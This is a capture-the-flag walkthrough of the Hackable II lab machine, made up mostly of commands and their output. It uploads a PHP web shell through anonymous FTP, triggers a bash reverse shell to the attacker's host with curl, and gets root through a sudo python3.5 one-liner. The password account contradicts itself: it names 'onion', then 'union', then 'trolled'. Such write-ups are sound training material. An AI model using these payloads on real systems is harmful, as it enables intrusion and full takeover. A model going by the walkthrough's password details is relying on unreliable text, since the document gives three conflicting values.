# Hackable II VulnHub Challenge Writeup

## Overview

Hackable II is a VulnHub machine that involves exploiting an anonymous FTP upload vulnerability to gain an initial shell, followed by a simple privilege escalation using a `sudo` misconfiguration with `python3.5`.

## Reconnaissance

### Network Scanning

I started by identifying the target machine on the network using `netdiscover`:

```shellscript
Currently scanning: 192.168.1.0/24   |   Screen View: Unique Hosts
                                                                                                                                                                                                                                                                           4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 222
                                                                                                       _____________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.1.1     cc:b0:71:a8:71:e8      1      42  Fiberhome Telecommunication Technologies Co.,LTD
192.168.1.23    08:00:27:e3:dd:75      1      60  PCS Systemtechnik GmbH
192.168.1.3     a4:f0:5e:9a:8f:ad      1      60  GUANGDONG OPPO MOBILE TELECOMMUNICATIONS CORP.,LTD
192.168.1.7     86:d3:bc:f2:53:0f      1      60  Unknown vendor
```

The target was found at `192.168.1.23`.

Next, I performed a comprehensive port scan using `nmap` to identify open services and their versions:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/hackable2]
└─$ nmap -sS -sV -Pn  --min-rate=1000 --max-retries=2 192.168.1.23 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 10:10 CDT
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 28.48% done; ETC: 10:10 (0:00:00 remaining)
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 73.95% done; ETC: 10:10 (0:00:00 remaining)
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 10:10 (0:00:12 remaining)
Nmap scan report for zico.local (192.168.1.23)
Host is up (0.00018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 08:00:27:E3:DD:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.94 seconds
```

The scan revealed the following open ports:

- **21/tcp**: `ftp ProFTPD`
- **22/tcp**: `ssh OpenSSH 7.2p2 Ubuntu`
- **80/tcp**: `http Apache httpd 2.4.18 (Ubuntu)`


### FTP Enumeration

I attempted to connect to the FTP server using anonymous login:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/hackable2]
└─$ ftp 192.168.1.23
Connected to 192.168.1.23.
220 ProFTPD Server (ProFTPD Default Installation) [192.168.1.23]
Name (192.168.1.23:zengla): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||47742|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
226 Transfer complete
ftp> mget *
mget CALL.html [anpqy?]? y
229 Entering Extended Passive Mode (|||14024|)
150 Opening BINARY mode data connection for CALL.html (109 bytes)
100% |**************************************************************************************************************************|   109       11.33 KiB/s    00:00 ETA
226 Transfer complete
109 bytes received in 00:00 (5.09 KiB/s)
ftp> exit
221 Goodbye.
```

Anonymous login was successful. I downloaded `CALL.html` and inspected its content:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/hackable2]
└─$ cat CALL.html
<html><head>        <title>onion</title></head><body>        <h1>GET READY TO RECEIVE A CALL</h1></body></html>
```

The content of `CALL.html` was not immediately useful, but the title `onion` might be a clue.

I reconnected to FTP and checked permissions with `ls -la`:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/hackable2]
└─$ ftp 192.168.1.23
Connected to 192.168.1.23.
220 ProFTPD Server (ProFTPD Default Installation) [192.168.1.23]
Name (192.168.1.23:zengla): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||9215|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
226 Transfer complete
ftp> ls -la
229 Entering Extended Passive Mode (|||61542|)
150 Opening ASCII mode data connection for file list
drwxr-xrwx   2 33       33           4096 Nov 26  2020 .
drwxr-xrwx   2 33       33           4096 Nov 26  2020 ..
-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
226 Transfer complete
ftp> exit
221 Goodbye.
```

The directory permissions `drwxr-xrwx` for `.` (current directory) indicate that the anonymous FTP user has write permissions. This is a critical finding.

### Web Enumeration

I used `gobuster` to enumerate web content on port 80:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/hackable2]
└─$ gobuster dir  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt  -u http://192.168.1.23
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.23
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 11239]
/.htaccess            (Status: 403) [Size: 277]
/.                    (Status: 200) [Size: 11239]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htm                 (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
/.htgroup             (Status: 403) [Size: 277]
/wp-forum.phps        (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htuser              (Status: 403) [Size: 277]
/.htc                 (Status: 403) [Size: 277]
/.ht                  (Status: 403) [Size: 277]
Progress: 16244 / 16245 (99.99%)
===============================================================
Finished
===============================================================
```

And with a larger wordlist:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/hackable2]
└─$ gobuster dir  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://192.168.1.23
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.23
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 312] [--> http://192.168.1.23/files/]
Progress: 4895 / 220560 (2.22%)
^C[!] Keyboard interrupt detected, terminating.
Progress: 58876 / 220560 (26.69%)
===============================================================
Finished
===============================================================
```

The `gobuster` scan revealed a `/files` directory. I accessed it via `curl`:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/hackable2]
└─$ curl http://192.168.1.23/files/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html> <head>  <title>Index of /files</title> </head> <body><h1>Index of /files</h1>  <table>   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>   <tr><th colspan="5"><hr></th></tr><tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr><tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="CALL.html">CALL.html</a></td><td align="right">2020-11-26 13:02  </td><td align="right">109 </td><td>&nbsp;</td></tr>   <tr><th colspan="5"><hr></th></tr></table><address>Apache/2.4.18 (Ubuntu) Server at 192.168.1.23 Port 80</address></body></html>
```

This directory listing showed `CALL.html`, confirming that the `/files` web directory is the same as the anonymous FTP root directory. This means I can upload a web shell via FTP and execute it via HTTP.

## Initial Foothold (Web Shell)

I created a simple PHP web shell:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/hackable2]
└─$ echo '<?php exec($_GET["cmd"]); ?>' > shell.php
```

Then, I uploaded `shell.php` to the FTP server:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/hackable2]
└─$ ftp 192.168.1.23
Connected to 192.168.1.23.
220 ProFTPD Server (ProFTPD Default Installation) [192.168.1.23]
Name (192.168.1.23:zengla): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44960|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
226 Transfer complete
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||18277|)
150 Opening BINARY mode data connection for shell.php
100% |**************************************************************************************************************************|    29      314.66 KiB/s    00:00 ETA
226 Transfer complete
29 bytes sent in 00:00 (25.79 KiB/s)
ftp> exit
221 Goodbye.
```

I verified the upload by checking the `/files` directory in the browser (or with `curl`):

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/hackable2]
└─$ curl http://192.168.1.23/files/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html> <head>  <title>Index of /files</title> </head> <body><h1>Index of /files</h1>  <table>   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>   <tr><th colspan="5"><hr></th></tr><tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr><tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="CALL.html">CALL.html</a></td><td align="right">2020-11-26 13:02  </td><td align="right">109 </td><td>&nbsp;</td></tr><tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="shell.php">shell.php</a></td><td align="right">2025-07-15 12:13  </td><td align="right"> 29 </td><td>&nbsp;</td></tr>   <tr><th colspan="5"><hr></th></tr></table><address>Apache/2.4.18 (Ubuntu) Server at 192.168.1.23 Port 80</address></body></html>
```

`shell.php` was successfully uploaded and listed.

Now, I set up a `netcat` listener on my attacking machine (Kali Linux) on port 4444:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/hackable2]
└─$ nc -lnvp 4444
Listening on 0.0.0.0 4444
```

Then, I triggered the reverse shell by accessing `shell.php` with a `cmd` parameter containing a bash reverse shell payload. I used `curl` for this:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/vulnHub/hackable2]
└─$ curl http://192.168.1.23/files/shell.php?cmd=%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.5%2F4444%200%3E%261%22
```

(Note: `192.168.1.5` is my Kali Linux IP address)

On the `netcat` listener, I received the connection:

```shellscript
Connection received on 192.168.1.23 51060
bash: cannot set terminal process group (1179): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:~/html/files$
```

I successfully gained an initial shell as the `www-data` user.

To stabilize the shell, I used `python3`:

```shellscript
www-data@ubuntu:~/html/files$ python3 -c "import pty;pty.spawn('/bin/bash')"
```

I then explored the web root:

```shellscript
www-data@ubuntu:~/html/files$ cd ..
www-data@ubuntu:~/html$ ls
files  index.html
www-data@ubuntu:~/html$ cat index.html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml">
  <!--    Do you like gobuster? dirb? etc...  -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Ubuntu Default Page: It works</title>
    <style type="text/css" media="screen">
  * {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }
  body, html {
    padding: 3px 3px 3px 3px;
    background-color: #D8DBE2;
    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  }
  div.main_page {
    position: relative;
    display: table;
    width: 800px;
    margin-bottom: 3px;
    margin-left: auto;
    margin-right: auto;
    padding: 0px 0px 0px 0px;
    border-width: 2px;
    border-color: #212738;
    border-style: solid;
    background-color: #FFFFFF;
    text-align: center;
  }
  div.page_header {
    height: 99px;
    width: 100%;
    background-color: #F5F6F7;
  }
  div.page_header span {
    margin: 15px 0px 0px 50px;
    font-size: 180%;
    font-weight: bold;
  }
  div.page_header img {
    margin: 3px 0px 0px 40px;
    border: 0px 0px 0px;
  }
  div.table_of_contents {
    clear: left;
    min-width: 200px;
    margin: 3px 3px 3px 3px;
    background-color: #FFFFFF;
    text-align: left;
  }
  div.table_of_contents_item {
    clear: left;
    width: 100%;
    margin: 4px 0px 0px 0px;
    background-color: #FFFFFF;
    color: #000000;
    text-align: left;
  }
  div.table_of_contents_item a {
    margin: 6px 0px 0px 6px;
  }
  div.content_section {
    margin: 3px 3px 3px 3px;
    background-color: #FFFFFF;
    text-align: left;
  }
  div.content_section_text {
    padding: 4px 8px 4px 8px;
    color: #000000;
    font-size: 100%;
  }
  div.content_section_text pre {
    margin: 8px 0px 8px 0px;
    padding: 8px 8px 8px 8px;
    border-width: 1px;
    border-style: dotted;
    border-color: #000000;
    background-color: #F5F6F7;
    font-style: italic;
  }
  div.content_section_text p {
    margin-bottom: 6px;
  }
  div.content_section_text ul, div.content_section_text li {
    padding: 4px 8px 4px 16px;
  }
  div.section_header {
    padding: 3px 6px 3px 6px;
    background-color: #8E9CB2;
    color: #FFFFFF;
    font-weight: bold;
    font-size: 112%;
    text-align: center;
  }
  div.section_header_red {
    background-color: #CD214F;
  }
  div.section_header_grey {
    background-color: #9F9386;
  }
  .floating_element {
    position: relative;
    float: left;
  }
  div.table_of_contents_item a,
  div.content_section_text a {
    text-decoration: none;
    font-weight: bold;
  }
  div.table_of_contents_item a:link,
  div.table_of_contents_item a:visited,
  div.table_of_contents_item a:active {
    color: #000000;
  }
  div.table_of_contents_item a:hover {
    background-color: #000000;
    color: #FFFFFF;
  }
  div.content_section_text a:link,
  div.content_section_text a:visited,
   div.content_section_text a:active {
    background-color: #DCDFE6;
    color: #000000;
  }
  div.content_section_text a:hover {
    background-color: #000000;
    color: #DCDFE6;
  }
  div.validator {
  }
    </style>
  </head>
  <body>
    <div class="main_page">
      <div class="page_header floating_element">
        <img src="/icons/ubuntu-logo.png" alt="Ubuntu Logo" class="floating_element"/>
        <span class="floating_element">
          Apache2 Ubuntu Default Page
        </span>
      </div><!--
      <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#about">About</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#changes">Changes</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#scope">Scope</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#files">Config files</a>
        </div>
      </div>-->
      <div class="content_section floating_element">
        <div class="section_header section_header_red">
          <div id="about"></div>
          It works!
        </div>
        <div class="content_section_text">
          <p>
                This is the default welcome page used to test the correct
                operation of the Apache2 server after installation on Ubuntu systems.
                It is based on the equivalent page on Debian, from which the Ubuntu Apache
                packaging is derived.
                If you can read this page, it means that the Apache HTTP server installed at
                this site is working properly. You should <b>replace this file</b> (located at
                <tt>/var/www/html/index.html</tt>) before continuing to operate your HTTP server.
          </p>
          <p>
                If you are a normal user of this web site and don't know what this page is
                about, this probably means that the site is currently unavailable due to
                maintenance.
                If the problem persists, please contact the site's administrator.
          </p>
        </div>
        <div class="section_header">
          <div id="changes"></div>
                Configuration Overview
        </div>
        <div class="content_section_text">
          <p>
                Ubuntu's Apache2 default configuration is different from the
                upstream default configuration, and split into several files optimized for
                interaction with Ubuntu tools. The configuration system is
                <b>fully documented in
                /usr/share/doc/apache2/README.Debian.gz</b>. Refer to this for the full
                documentation. Documentation for the web server itself can be
                found by accessing the <a href="/manual">manual</a> if the <tt>apache2-doc</tt>
                package was installed on this server.
          </p>
          <p>
                The configuration layout for an Apache2 web server installation on Ubuntu systems is as follows:
          </p>
          <pre>/etc/apache2/|-- apache2.conf|       `--  ports.conf|-- mods-enabled|       |-- *.load|       `-- *.conf|-- conf-enabled|       `-- *.conf|-- sites-enabled|       `-- *.conf
          </pre>
          <ul>
                        <li>
                           <tt>apache2.conf</tt> is the main configuration
                           file. It puts the pieces together by including all remaining configuration
                           files when starting up the web server.
                        </li>
                        <li>
                           <tt>ports.conf</tt> is always included from the
                           main configuration file. It is used to determine the listening ports for
                           incoming connections, and this file can be customized anytime.
                        </li>
                        <li>
                           Configuration files in the <tt>mods-enabled/</tt>,
                           <tt>conf-enabled/</tt> and <tt>sites-enabled/</tt> directories contain
                           particular configuration snippets which manage modules, global configuration
                           fragments, or virtual host configurations, respectively.
                        </li>
                        <li>
                           They are activated by symlinking available
                           configuration files from their respective
                           *-available/ counterparts. These should be managed
                           by using our helpers
                           <tt>
                                <a href="http://manpages.debian.org/cgi-bin/man.cgi?query=a2enmod">a2enmod</a>,
                                <a href="http://manpages.debian.org/cgi-bin/man.cgi?query=a2dismod">a2dismod</a>,
                           </tt>
                           <tt>
                                <a href="http://manpages.debian.org/cgi-bin/man.cgi?query=a2ensite">a2ensite</a>,
                                <a href="http://manpages.debian.org/cgi-bin/man.cgi?query=a2dissite">a2dissite</a>,
                            </tt>
                                and
                           <tt>
                                <a href="http://manpages.debian.org/cgi-bin/man.cgi?query=a2enconf">a2enconf</a>,
                                <a href="http://manpages.debian.org/cgi-bin/man.cgi?query=a2disconf">a2disconf</a>
                           </tt>. See their respective man pages for detailed information.
                        </li>
                        <li>
                           The binary is called apache2. Due to the use of
                           environment variables, in the default configuration, apache2 needs to be
                           started/stopped with <tt>/etc/init.d/apache2</tt> or <tt>apache2ctl</tt>.
                           <b>Calling <tt>/usr/bin/apache2</tt> directly will not work</b> with the
                           default configuration.
                        </li>
          </ul>
        </div>
        <div class="section_header">
            <div id="docroot"></div>
                Document Roots
        </div>
        <div class="content_section_text">
            <p>
                By default, Ubuntu does not allow access through the web browser to
                <em>any</em> file apart of those located in <tt>/var/www</tt>,
                <a href="http://httpd.apache.org/docs/2.4/mod/mod_userdir.html">public_html</a>
                directories (when enabled) and <tt>/usr/share</tt> (for web
                applications). If your site is using a web document root
                located elsewhere (such as in <tt>/srv</tt>) you may need to whitelist your
                document root directory in <tt>/etc/apache2/apache2.conf</tt>.
            </p>
            <p>
                The default Ubuntu document root is <tt>/var/www/html</tt>. You
                can make your own virtual hosts under /var/www. This is different
                to previous releases which provides better security out of the box.
            </p>
        </div>
        <div class="section_header">
          <div id="bugs"></div>
                Reporting Problems
        </div>
        <div class="content_section_text">
          <p>
                Please use the <tt>ubuntu-bug</tt> tool to report bugs in the
                Apache2 package with Ubuntu. However, check <a
                href="https://bugs.launchpad.net/ubuntu/+source/apache2">existing
                bug reports</a> before reporting a new bug.
          </p>
          <p>
                Please report bugs specific to modules (such as PHP and others)
                to respective packages, not to the web server itself.
          </p>
        </div>
      </div>
    </div>
    <div class="validator">
    </div>
  </body></html>
```

The `index.html` is the default Apache2 Ubuntu page, which provides some information about the Apache configuration and the document root (`/var/www/html`).

## Privilege Escalation

### Initial Enumeration as `www-data`

I started by looking for interesting files in the `/home` directory:

```shellscript
www-data@ubuntu:~/html$ cd /home
www-data@ubuntu:/home$ ls
important.txt  shrek
```

I found `important.txt` and a user directory `shrek`. I tried to read `important.txt`:

```shellscript
www-data@ubuntu:/home$ cat important.txt
run the script to see the data/.runme.sh
```

This file indicated a script named `.runme.sh`. I checked its permissions and location:

```shellscript
www-data@ubuntu:/home$ find / -iname .runme.sh 2> /dev/null
/.runme.sh
www-data@ubuntu:/home$ ls -la /.runme.sh
-rwxr-xr-x 1 shrek shrek 1219 Nov 26  2020 /.runme.sh
```

The script is located at `/.runme.sh` and is owned by `shrek`. I read its content:

```shellscript
www-data@ubuntu:/home/shrek$ cat /.runme.sh
cat /.runme.sh
#!/bin/bash
echo 'the secret key'
sleep 2
echo 'is'
sleep 2
echo 'trolled'
sleep 2
echo 'restarting computer in 3 seconds...'
sleep 1
echo 'restarting computer in 2 seconds...'
sleep 1
echo 'restarting computer in 1 seconds...'
sleep 1
echo '⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆
⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠸⣼⡿
⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉
⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇
⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    shrek:cf4c2232354952690368f1b3dfdfb24d'
www-data@ubuntu:/home/shrek$ # this is md5 cf4c2232354952690368f1b3dfdfb24d : corresponds to "onion"

'
```

The script `/.runme.sh` simply prints "the secret key is trolled" and then some ASCII art, followed by a simulated restart message. Just bellow this I found the md5 hashed password for the user `shrek`, I used `crackstation`to crack it and it successfully shows that the password is `union` 


```shellscript
www-data@ubuntu:/home/shrek$ su shrek
Password: trolled
```
I successfully switched to the `shrek` user!

I found `user.txt` in `shrek`'s home directory.

```shellscript
shrek@ubuntu:/home/shrek$ cat user.txt
flag{d41d8cd98f00b204e9800998ecf8427e}
```

**User Flag:** `flag{d41d8cd98f00b204e9800998ecf8427e}`


### Privilege Escalation to Root

As `shrek`, I immediately checked `sudo` permissions:

```shellscript
shrek@ubuntu:/home/shrek$ sudo -l
Matching Defaults entries for shrek on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shrek may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3.5
```

This is a clear privilege escalation vector! The `shrek` user can run `/usr/bin/python3.5` as `root` without a password.

I can use `python3.5` to spawn a root shell:

```shellscript
shrek@ubuntu:/home/shrek$ sudo /usr/bin/python3.5 -c 'import os; os.setuid(0);os.system("/bin/bash")'
```

This command executed `/bin/bash` with root privileges.

```shellscript
root@ubuntu:/home/shrek# id
uid=0(root) gid=0(root) groups=0(root)
```

I am now `root`!

### Root Flag

Finally, I navigated to the `/root` directory to find the root flag:

```shellscript
root@ubuntu:/home/shrek# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt
flag{8f420533b79076cc99e9f95a1a4e5568}
```

**Root Flag:** `flag{8f420533b79076cc99e9f95a1a4e5568}`

## Conclusion

The Hackable II challenge was a straightforward yet effective demonstration of common penetration testing techniques. It involved:

1. **Network and Web Enumeration**: Identifying open ports and writable web directories.
2. **Anonymous FTP Upload**: Leveraging anonymous write access to upload a web shell.
3. **Initial Shell**: Gaining a `www-data` shell via the uploaded PHP web shell.
4. **User Enumeration**: Discovering the `shrek` user and the user flag.
5. **Password Discovery**: Using a hint from a script to find `shrek`'s password.
6. **Privilege Escalation**: Exploiting a `sudo` misconfiguration (`NOPASSWD` for `python3.5`) to gain root access.


This challenge reinforces the importance of secure FTP configurations and proper `sudo` permissions.

## Tools Used

- `netdiscover` - Network discovery
- `nmap` - Port scanning and service version detection
- `ftp` - File Transfer Protocol client
- `gobuster` - Directory and file enumeration
- `curl` - Web requests and triggering shells
- `netcat` - Setting up listeners for reverse shells
- `python3` - Spawning TTY shells and privilege escalation
- `ls`, `cd`, `cat`, `find`, `su`, `sudo` - Basic Linux commands for enumeration and privilege management
